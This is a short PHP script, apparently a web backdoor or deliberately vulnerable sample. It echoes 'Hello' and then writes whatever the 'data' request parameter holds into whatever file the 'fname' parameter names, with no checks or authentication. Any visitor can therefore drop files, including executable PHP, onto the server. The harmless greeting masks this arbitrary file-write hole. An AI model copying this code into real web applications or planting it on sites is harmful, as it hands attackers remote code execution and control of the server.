<?php
    echo "Hello";
    $file =  $_REQUEST["fname"];
    $data =  $_REQUEST["data"];
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
?>

